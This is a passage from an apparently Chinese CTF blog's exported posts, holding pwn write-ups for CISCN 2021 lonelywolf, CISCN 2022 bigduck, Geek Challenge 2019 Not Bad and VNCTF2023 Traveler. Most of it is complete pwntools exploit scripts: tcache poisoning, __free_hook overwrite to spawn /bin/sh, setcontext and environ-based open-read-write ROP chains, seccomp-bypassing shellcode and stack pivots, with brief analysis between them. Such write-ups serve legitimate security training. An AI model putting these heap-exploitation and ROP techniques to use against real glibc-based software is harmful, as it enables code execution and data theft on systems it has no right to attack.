= libc_addr + 0x000000000001b500syscall = libc_addr + libc.sym[&#x27;alarm&#x27;]+0x5# ret_addr = libc_addr + 0x0000000000023eeb# rdi_addr = libc_addr + 0x00000000000215bf# rsi_addr = libc_addr + 0x0000000000023eea# rdx_addr = libc_addr + 0x0000000000001b96# rax_addr = libc_addr + 0x0000000000043ae8# syscall = libc_addr + libc.sym[&#x27;alarm&#x27;]+0x5add(0,0x18)#修改free_hookedit(0,p64(setcontext))add(0,0x28)#设置rdi 顺便用来放./flag字符串edit(0,b&#x27;./flag\\x00\\x00&#x27;)add(0,0x38)#劫持rsp指针edit(0,p64(heap_addr+0x2000)+p64(ret_addr)) 劫持rsp指针的payload这里就不解释了 可以看我相关博客 #openflag_addr = heap_addr + 0x1000rop_open = p64(rdi_addr)+p64(flag_addr)rop_open += p64(rsi_addr)+p64(0)rop_open += p64(rax_addr)+p64(2)rop_open += p64(syscall)#readrop_read = p64(rdi_addr)+p64(3)rop_read += p64(rsi_addr)+p64(flag_addr)rop_read += p64(rdx_addr)+p64(0x30)rop_read += p64(rax_addr)+p64(0)rop_read += p64(syscall)#writerop_write = p64(rdi_addr)+p64(1)rop_write += p64(rsi_addr)+p64(flag_addr)rop_write += p64(rdx_addr)+p64(0x30)rop_write += p64(rax_addr)+p64(1)rop_write += p64(syscall)payload = rop_open+rop_read+rop_writeadd(0,0x58) #布置rop链edit(0,payload[:0x58])add(0,0x78) #布置rop链edit(0,payload[0x58:]) 接着就是布置rop链了 分两次部署 [:0x58]和[0x58:]就是取前后0x58字节的部分 这个python语法问题 没啥好说的 最后就是释放0x50链表的chunk了 成功获取flag add(0,0x48)# gdb.attach(io,&#x27;b *&#x27;+str(heap_addr+0x2000))# pause(0)delete(0)io.recv() 完整exp: from pwn import*from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;1.14.71.254&quot;,28068)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&quot;)#libc = ELF(&quot;./刷题/libc-2.27.so&quot;)# context.arch = &quot;i386&quot;elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause()def add(index,size): io.recvuntil(&quot;Your choice: &quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;Done!&quot;)def edit(index,content): io.recvuntil(&quot;Your choice: &quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Content: &quot;) io.sendline(content)def show(index): io.recvuntil(&quot;Your choice: &quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))def delete(index): io.recvuntil(&quot;Your choice: &quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))add(0,0x28)delete(0)edit(0,p64(0)*2)delete(0)add(0,0x28)show(0)heap_addr = (u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;)) &gt;&gt; 12) * (0x1000)-0x1000success(&quot;heap_addr :&quot;+hex(heap_addr))edit(0,p64(heap_addr+0x10))add(0,0x28)add(0,0x28)edit(0,p64(0)*4+p64(0x7000000))delete(0)show(0)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - (0x7f98511ebca0-0x7f9850e00000)success(&quot;libc_addr :&quot;+hex(libc_addr))free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]setcontext = libc_addr + libc.sym[&#x27;setcontext&#x27;] + 53add(0,0x48)edit(0,p64(0)*8+p64(heap_addr+0x50))add(0,0x18)edit(0,p64(0)*2+p64(heap_addr+0x50))add(0,0x38)payload = p64(free_hook)+p64(heap_addr+0x1000)+p64(heap_addr+0x1000+0xa0) #0x20 0x30 0x40payload += p64(heap_addr+0x1000)+p64(heap_addr+0x2000)+p64(0)+p64(heap_addr+0x2000+0x58) #0x50 0x60 0x70 0x80edit(0,payload)ret_addr = libc_addr + 0x00000000000008aardi_addr = libc_addr + 0x000000000002164frsi_addr = libc_addr + 0x0000000000023a6ardx_addr = libc_addr + 0x0000000000001b96rax_addr = libc_addr + 0x000000000001b500syscall = libc_addr + libc.sym[&#x27;alarm&#x27;]+0x5# ret_addr = libc_addr + 0x0000000000023eeb# rdi_addr = libc_addr + 0x00000000000215bf# rsi_addr = libc_addr + 0x0000000000023eea# rdx_addr = libc_addr + 0x0000000000001b96# rax_addr = libc_addr + 0x0000000000043ae8# syscall = libc_addr + libc.sym[&#x27;alarm&#x27;]+0x5add(0,0x18)#修改free_hookedit(0,p64(setcontext))add(0,0x28)#设置rdi 顺便用来放./flag字符串edit(0,b&#x27;./flag\\x00\\x00&#x27;)add(0,0x38)#劫持rsp指针edit(0,p64(heap_addr+0x2000)+p64(ret_addr))#openflag_addr = heap_addr + 0x1000rop_open = p64(rdi_addr)+p64(flag_addr)rop_open += p64(rsi_addr)+p64(0)rop_open += p64(rax_addr)+p64(2)rop_open += p64(syscall)#readrop_read = p64(rdi_addr)+p64(3)rop_read += p64(rsi_addr)+p64(flag_addr)rop_read += p64(rdx_addr)+p64(0x30)rop_read += p64(rax_addr)+p64(0)rop_read += p64(syscall)#writerop_write = p64(rdi_addr)+p64(1)rop_write += p64(rsi_addr)+p64(flag_addr)rop_write += p64(rdx_addr)+p64(0x30)rop_write += p64(rax_addr)+p64(1)rop_write += p64(syscall)payload = rop_open+rop_read+rop_writeadd(0,0x58) #布置rop链edit(0,payload[:0x58])add(0,0x78) #布置rop链edit(0,payload[0x58:])add(0,0x48)# gdb.attach(io,&#x27;b *&#x27;+str(heap_addr+0x2000))# pause(0)delete(0)io.recv() [CISCN 2021 初赛]lonelywolf比上面那一题更加简单 因为没有了沙盒限制 手法一模一样 就直接放exp了 唯一的麻烦是打不通远程 因为远程是2.27 1.4的版本 搞不到 from pwn import*from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;1.14.71.254&quot;,28793)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&quot;)#libc = ELF(&quot;./刷题/libc-2.27.so&quot;)# context.arch = &quot;i386&quot;elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause()def add(index,size): io.recvuntil(&quot;Your choice: &quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;Done!&quot;)def edit(index,content): io.recvuntil(&quot;Your choice: &quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Content: &quot;) io.sendline(content)def show(index): io.recvuntil(&quot;Your choice: &quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))def delete(index): io.recvuntil(&quot;Your choice: &quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))add(0,0x70)delete(0)edit(0,p64(0)*2)delete(0)show(0)heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x260success(&quot;heap_addr :&quot;+hex(heap_addr))edit(0,p64(heap_addr+0x10))add(0,0x70)add(0,0x70)payload = p64(0)*4+p64(0x7000000)edit(0,payload)delete(0)show(0)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - (0x7f85379ebca0-0x7f8537600000)success(&quot;libc_addr :&quot;+hex(libc_addr))free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]add(0,0x60)payload = p64(0)*8+p64(free_hook)edit(0,payload)add(0,0x10)edit(0,p64(system_addr))add(0,0x20)edit(0,b&#x27;/bin/sh\\x00&#x27;)delete(0)io.interactive() [CISCN 2022 华东北]bigduck通过这题学到了很多新东西 先来看一下保护机制吧 这一道题是libc2.33的环境 并且开启了沙盒 接着ida分析一下程序 void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; int v3; // [rsp+Ch] [rbp-4h] init_sandbox(); while ( 1 ) &#123; while ( 1 ) &#123; menu(a1, a2); v3 = ((&amp;sub_1268 + 1))(); if ( v3 != 4 ) break; edit(); &#125; if ( v3 &gt; 4 ) &#123;LABEL_13: a1 = &quot;Invalid choice&quot;; puts(&quot;Invalid choice&quot;); &#125; else if ( v3 == 3 ) &#123; show(); &#125; else &#123; if ( v3 &gt; 3 ) goto LABEL_13; if ( v3 == 1 ) &#123; add(); &#125; else &#123; if ( v3 != 2 ) goto LABEL_13; delete(); &#125; &#125; &#125;&#125; 标准的菜单题 函数给的挺全 没有堆溢出 但是有UAF 值得注意的是 add函数只能申请0x100大小的chunk 既然给了打印堆块内容的机会 那么这里想的是通过unsortebin来泄露libc基址 不过由于只能申请0x100的chunk 那就通过填满tcache链表的办法 for i in range(7): add()add()#7add()#8for i in range(7): delete(i)delete(7) 成功将chunk7释放进unsortedbin edit(7,1,b&#x27;\\x01&#x27;)show(7)io.recv()main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x1-96success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - libc.sym[&#x27;__malloc_hook&#x27;]-0x10success(&quot;libc_addr :&quot;+hex(libc_addr))edit(7,1,b&#x27;\\x00&#x27;) 接下来就是把main_arena_addr打印出来了 唯一一点需要注意的就是该libc版本main_arena_addr + 96末位是\\x00 所以printf函数无法将其打印出来 需要我们修改一下末尾的值 最后再减去 接下来 由于高版本多了一个tcache链表的fd异或保护机制 所以还需要泄露堆基址 这个也比较简单 直接打印处链表尾的chunk0就好了 show(0)io.recv()key = u64(io.recv(5).ljust(8,b&#x27;\\x00&#x27;))success(&quot;key :&quot;+hex(key))heap_addr = key &lt;&lt; 12success(&quot;heap_addr :&quot;+hex(heap_addr)) 接下来 我们就需要想办法获取flag了 由于开启了沙盒 所以没有办法通过简单的通过hook函数来获取shell 之前的题目做过通过setcontext来劫持rsp指针 迁移到我们在堆上布置的rop链 不过由于2.33 其从rdi寻址改成了rcx寻址 给利用带来了不少难度 所以这里只能作废了 这里使用我们做栈题的老办法了 覆盖ret addr 那么获取到栈地址是一个关键的问题 这里可以使用environ指针 我们跟进一下其存储的栈地址 可以看到低地址处是一个栈帧 我们可以覆盖这个栈帧的ret addr 至于这个是谁的栈帧呢 我编写了一个小程序来动调查验 #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;malloc.h&gt;void test1()&#123; puts(&quot;test1&quot;);&#125;void test2()&#123; puts(&quot;test2&quot;);&#125;int main()&#123; test1(); test2(); test1();&#125; 经过测试 不论是跟进到test函数中 还是在main函数中 environ索引到的都是栈帧高地址处的一块内存 覆盖的ret addr实际上是使得任何函数的返回地址都为止修改(待考证 目前可以确定的是哪怕read函数的返回地址也是受到这个影响的 等我有空更深入了解一下堆栈结构吧 感觉这方面的理解还是不清楚) 经过计算 我们得到了ret addr的地址 接下里只要利用tcachebin attack任意写修改其值就可以了 for i in range(5): add() #9-13edit(1,8,p64(environ_addr ^ key))add()#14add()#15edit(0,8,b&#x27;./flag\\x00\\x00&#x27;)show(15)io.recv()stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x138success(&quot;stack_addr :&quot;+hex(stack_addr)) 我们先将tcache清空一下 取出大部分chunk 就留下两个留着攻击 随后申请到environ处 利用show函数打印处栈地址 delete(9)delete(10)edit(10,8,p64(stack_addr^key))add()#16add()#17rdi_addr = libc_addr + libc.search(asm(&#x27;pop rdi;ret;&#x27;)).__next__()rsi_addr = libc_addr + libc.search(asm(&#x27;pop rsi;ret;&#x27;)).__next__()rdx_addr = libc_addr + 0x00000000000c7f32# rax_addr = libc_addr + 0x0000000000044c70# syscall = libc_addr + 0x0000000000026858open_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]#open#flag_addr = stack_addr +0x10flag_addr = heap_addr + 0x2a0payload = p64(0)*3+p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(0) + p64(open_addr)payload += p64(rdi_addr) + p64(3) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_addr) + p64(0x50) + p64(read_addr)payload += p64(rdi_addr) + p64(1) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_addr) + p64(0x50) + p64(write_addr)# gdb.attach(io,&#x27;b *&#x27;+str(rdi_addr))# gdb.attach(io,&#x27;b *$rebase(0x14AD)&#x27;)# pause(0)edit(17,len(payload),payload)io.recv()io.recv()debug() 接下来任意写到ret addr不远处 这里准确的应该是stack_addr - 0x128 但是好像不能直接申请到这里 估计是malloc检查之类的锅 有待考究 至于申请到stack_addr - 0x138的话 覆盖到了canary 但是不会触发报错 是因为压根没检查 可能是出题人通过什么办法去掉了吧 完整exp: from pwn import*from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;1.14.71.254&quot;,28793)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc.so.6&quot;)#libc = ELF(&quot;./刷题/libc-2.27.so&quot;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause()def add(): io.recvuntil(&quot;Choice: &quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;Done&quot;)def delete(index): io.recvuntil(&quot;Choice: &quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;Idx: &quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;Choice: &quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;Idx: &quot;) io.sendline(str(index))def edit(index,size,content): io.recvuntil(&quot;Choice: &quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;Idx: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;Content: &quot;) io.sendline(content)for i in range(7): add()add()#7add()#8for i in range(7): delete(i)delete(7)edit(7,1,b&#x27;\\x01&#x27;)show(7)io.recv()main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x1-96success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - libc.sym[&#x27;__malloc_hook&#x27;]-0x10success(&quot;libc_addr :&quot;+hex(libc_addr))edit(7,1,b&#x27;\\x00&#x27;)show(0)io.recv()key = u64(io.recv(5).ljust(8,b&#x27;\\x00&#x27;))success(&quot;key :&quot;+hex(key))heap_addr = key &lt;&lt; 12success(&quot;heap_addr :&quot;+hex(heap_addr))environ_addr = libc_addr + libc.sym[&#x27;environ&#x27;]for i in range(5): add() #9-13edit(1,8,p64(environ_addr ^ key))add()#14add()#15edit(0,8,b&#x27;./flag\\x00\\x00&#x27;)show(15)io.recv()stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x138success(&quot;stack_addr :&quot;+hex(stack_addr))delete(9)delete(10)edit(10,8,p64(stack_addr^key))add()#16add()#17rdi_addr = libc_addr + libc.search(asm(&#x27;pop rdi;ret;&#x27;)).__next__()rsi_addr = libc_addr + libc.search(asm(&#x27;pop rsi;ret;&#x27;)).__next__()rdx_addr = libc_addr + 0x00000000000c7f32# rax_addr = libc_addr + 0x0000000000044c70# syscall = libc_addr + 0x0000000000026858open_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]#open#flag_addr = stack_addr +0x10flag_addr = heap_addr + 0x2a0payload = p64(0)*3+p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(0) + p64(open_addr)payload += p64(rdi_addr) + p64(3) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_addr) + p64(0x50) + p64(read_addr)payload += p64(rdi_addr) + p64(1) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_addr) + p64(0x50) + p64(write_addr)# gdb.attach(io,&#x27;b *&#x27;+str(rdi_addr))# gdb.attach(io,&#x27;b *$rebase(0x14AD)&#x27;)# pause(0)edit(17,len(payload),payload)io.recv()io.recv()debug() 另外关于最后的劫持程序执行流 还有一种办法 我们之前不是提到过 可以确定的是read函数的栈帧也是在那一块吗 可以劫持read函数执行完后的程序执行流 并且由于我们没有破坏原本的栈结构 所以程序执行完 还是可以正常返回的 我们将任意写的地址改为stack_addr - 0x168 然后s到read函数中的syscall来看一看 可以看到 如果我们在rop链前添上8字节的垃圾数据的话 在执行完read后 rsp指针指向的刚好就是rop链的首地址 这时候执行ret指令 就劫持了程序执行流 另外一种exp: from pwn import*from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;1.14.71.254&quot;,28793)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc.so.6&quot;)#libc = ELF(&quot;./刷题/libc-2.27.so&quot;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause()def add(): io.recvuntil(&quot;Choice: &quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;Done&quot;)def delete(index): io.recvuntil(&quot;Choice: &quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;Idx: &quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;Choice: &quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;Idx: &quot;) io.sendline(str(index))def edit(index,size,content): io.recvuntil(&quot;Choice: &quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;Idx: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;Content: &quot;) io.sendline(content)for i in range(7): add()add()#7add()#8for i in range(7): delete(i)delete(7)edit(7,1,b&#x27;\\x01&#x27;)show(7)io.recv()main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x1-96success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - libc.sym[&#x27;__malloc_hook&#x27;]-0x10success(&quot;libc_addr :&quot;+hex(libc_addr))edit(7,1,b&#x27;\\x00&#x27;)show(0)io.recv()key = u64(io.recv(5).ljust(8,b&#x27;\\x00&#x27;))success(&quot;key :&quot;+hex(key))heap_addr = key &lt;&lt; 12success(&quot;heap_addr :&quot;+hex(heap_addr))environ_addr = libc_addr + libc.sym[&#x27;environ&#x27;]for i in range(5): add() #9-13edit(1,8,p64(environ_addr ^ key))add()#14add()#15edit(0,8,b&#x27;./flag\\x00\\x00&#x27;)show(15)io.recv()stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x168success(&quot;stack_addr :&quot;+hex(stack_addr))delete(9)delete(10)edit(10,8,p64(stack_addr^key))add()#16add()#17rdi_addr = libc_addr + libc.search(asm(&#x27;pop rdi;ret;&#x27;)).__next__()rsi_addr = libc_addr + libc.search(asm(&#x27;pop rsi;ret;&#x27;)).__next__()rdx_addr = libc_addr + 0x00000000000c7f32# rax_addr = libc_addr + 0x0000000000044c70# syscall = libc_addr + 0x0000000000026858open_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]#open#flag_addr = stack_addr +0x10flag_addr = heap_addr + 0x2a0payload = p64(0)*1+p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(0) + p64(open_addr)payload += p64(rdi_addr) + p64(3) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_addr) + p64(0x50) + p64(read_addr)payload += p64(rdi_addr) + p64(1) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_addr) + p64(0x50) + p64(write_addr)# gdb.attach(io,&#x27;b *&#x27;+str(rdi_addr))# gdb.attach(io,&#x27;b *$rebase(0x1541)&#x27;)# pause(0)edit(17,len(payload),payload)io.recv()io.recv() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"极客大挑战 2019 Not Bad","slug":"极客大挑战-2019-Not-Bad","date":"2023-02-19T05:55:29.000Z","updated":"2023-09-14T17:18:16.000Z","comments":true,"path":"2023/02/19/极客大挑战-2019-Not-Bad/","link":"","permalink":"http://example.com/2023/02/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Not-Bad/","excerpt":"","text":"手写shellcode 但是比较简单 记录一下思路 保护机制 [!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments ida看一下 __int64 __fastcall main(int a1, char **a2, char **a3)&#123; mmap((void *)0x123000, 0x1000uLL, 6, 34, -1, 0LL); seccomp(); buffer(); vuln(); return 0LL;&#125; mmap开辟了一块内存 地址从0x123000 - 0x124000 权限是可写可执行 还有三个函数 跟进一下看看 __int64 seccomp()&#123; __int64 v1; // [rsp+8h] [rbp-8h] v1 = seccomp_init(0LL); seccomp_rule_add(v1, 2147418112LL, 0LL, 0LL); seccomp_rule_add(v1, 2147418112LL, 1LL, 0LL); seccomp_rule_add(v1, 2147418112LL, 2LL, 0LL); seccomp_rule_add(v1, 2147418112LL, 60LL, 0LL); return seccomp_load(v1);&#125; 开沙盒了 看看限制了啥 line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x05 0xffffffff if (A != 0xffffffff) goto 0010 0005: 0x15 0x03 0x00 0x00000000 if (A == read) goto 0009 0006: 0x15 0x02 0x00 0x00000001 if (A == write) goto 0009 0007: 0x15 0x01 0x00 0x00000002 if (A == open) goto 0009 0008: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x06 0x00 0x00 0x00000000 return KILL 只能允许open read write三个函数 那就是orw了 接着跟进下一个函数 void buffer()&#123; setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL);&#125; 清空了缓存区 这个没啥好说的 跟进下一个函数 int vuln()&#123; char buf[32]; // [rsp+0h] [rbp-20h] BYREF puts(&quot;Easy shellcode, have fun!&quot;); read(0, buf, 0x38uLL); return puts(&quot;Baddd! Focu5 me! Baddd! Baddd!&quot;);&#125; 给了一次0x10字节栈溢出的机会 这种情况下大概率就是手写shellcode了 应该是有哪个地方给了jmp rsp指令 ropgadget找一下 chen@chen-virtual-machine:~$ ROPgadget --binary pwn --only &#x27;jmp|rsp&#x27;Gadgets information============================================================0x00000000004002d8 : jmp 0x4002ad0x000000000040078b : jmp 0x4007700x00000000004008eb : jmp 0x4008800x0000000000400b03 : jmp 0x400b7a0x0000000000400b87 : jmp qword ptr [rax - 0x68000000]0x0000000000400ceb : jmp qword ptr [rbp]0x0000000000400865 : jmp rax0x0000000000400a01 : jmp rspUnique gadgets found: 8 果然有一个 不过由于0x10还要算上jmp rsp 那么给shellcode的字节就只有8字节了 这显然是啥也干不了的 gdb动调看了下寄存器 都要我们重新赋值 这个时候可以利用sub rsp来往上抬栈 从而使得原本是用垃圾数据填充的部分可以被我们利用起来 完整exp: from pwn import *context.log_level = &#x27;debug&#x27;#io=process(&#x27;./pwn&#x27;)io = remote(&quot;node4.buuoj.cn&quot;,26981)elf = ELF(&#x27;./pwn&#x27;)#libc = ELF(&#x27;./locate&#x27;)libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)context.arch = &quot;amd64&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]jmp_rsp = 0x400A01magic_addr = 0x123000io.recvuntil(&quot;Easy shellcode, have fun!&quot;)shellcode = &quot;&quot;&quot;xor eax,eaxxor edi,edimov edx,200mov rsi,0x123500syscalljmp rsi&quot;&quot;&quot;shellcode2 = &quot;&quot;&quot;sub rsp,0x30jmp rsp&quot;&quot;&quot;payload = asm(shellcode).ljust(0x28,b&#x27;\\x00&#x27;)+p64(jmp_rsp)+asm(shellcode2)# gdb.attach(io,&#x27;b *0x400A4A&#x27;)# pause(0)io.send(payload)shellcode3 = asm(shellcraft.open(&#x27;./flag&#x27;))shellcode3 += asm(shellcraft.read(3,magic_addr+0x50,0x50))shellcode3 += asm(shellcraft.write(1,magic_addr+0x50,0x50))io.send(shellcode3)io.recv()io.recv()io.recv() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"VNCTF2023","slug":"VNCTF2023","date":"2023-02-18T14:26:28.000Z","updated":"2023-09-14T17:20:58.000Z","comments":true,"path":"2023/02/18/VNCTF2023/","link":"","permalink":"http://example.com/2023/02/18/VNCTF2023/","excerpt":"","text":"Traveler保护机制 ida 两个关键函数 int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf[32]; // [rsp+0h] [rbp-20h] BYREF init(argc, argv, envp); puts(&quot;who r u?&quot;); read(0, buf, 0x30uLL); puts(&quot;How many travels can a person have in his life?&quot;); read(0, &amp;msg, 0x28uLL); return 0;&#125; int boynextdoor()&#123; return system(&quot;echo flag&quot;);&#125; boynextdoor函数只能输出flag字符串 而非flag文件内容 单纯的提供了system函数 所以这里大胆猜测这题不用泄露libc基址 回到main函数 提供了两次read 一次可以溢出0x10字节的数据 一次往bss段写数据 再加上提供了system函数 所以这里一开始是想的很简单 直接栈迁移到bss段上 构造system(“&#x2F;bin&#x2F;sh”) 但是很快发现打不通 执行流卡在了这里 此时的rsp位于0x403d00 问题可能出在这里 因为这题的bss段的位置实在是太奇怪了 按理来说64位的二进制程序中bss段一般都是0x600000往后的 可以看到0x403000 - 0x404000 是只有可读权限的 只有在0x404000 - 0x405000之间才有写权限 所以此时rsp执行到了0x403d00以后 没有办法继续写入内容了 故无法成功执行system 那么此时就是想办法抬高栈帧 一开始是打算构造read来往高地址重新写入rop链 随后返回main函数重新栈迁移 但是再次执行read函数的时候 rsi寄存器受到了污染 不在指向原本的栈地址 .text:000000000040121A mov edx, 30h ; &#x27;0&#x27; ; nbytes.text:000000000040121F mov rsi, rax ; buf.text:0000000000401222 mov edi, 0 ; fd.text:0000000000401227 call _read 不过联想到了西湖论剑的calc的做法 在bss段构造rop链 写入的地址紧跟在rop链后 这样就可以循环执行 具体可以去看我相关的博客 完整exp: from pwn import *context.log_level = &#x27;debug&#x27;io=process(&#x27;./pwn&#x27;)#io = remote(&quot;node4.buuoj.cn&quot;,25261)elf = ELF(&#x27;./pwn&#x27;)#libc = ELF(&#x27;./locate&#x27;)context.arch = &quot;amd64&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]io.recvuntil(&quot;who r u?&quot;)backdoor_addr = 0x4011ddleave_addr = 0x0000000000401253bss_addr = 0x4040A0payload = cyclic(0x20)+p64(bss_addr)+p64(leave_addr)io.send(payload)rdi_addr = 0x4012c3system_addr = 0x4011ECputs_plt = 0x401070puts_got = elf.got[&#x27;puts&#x27;]start_addr = 0x4010b0read_got = elf.got[&#x27;read&#x27;]system_got = elf.got[&#x27;system&#x27;]main_addr = elf.sym[&#x27;main&#x27;]ret_addr = 0x000000000040101aio.recvuntil(&quot;How many travels can a person have in his life?&quot;)read_addr = 0x4010a0rsi_r15_addr = 0x00000000004012c1add_rsp = 0x0000000000401016rsp_addr = 0x00000000004012bdpayload = b&#x27;/bin/sh\\x00&#x27;+p64(rsi_r15_addr)+p64(0x4040c8)+p64(0)+p64(read_addr)# gdb.attach(io,&#x27;b *0x401254&#x27;)# pause(0)io.send(payload)payload = p64(ret_addr)+p64(rsi_r15_addr)+p64(0x4040f0)+p64(0x4040f0)+p64(read_addr)io.send(payload)for i in range(1,50): payload = 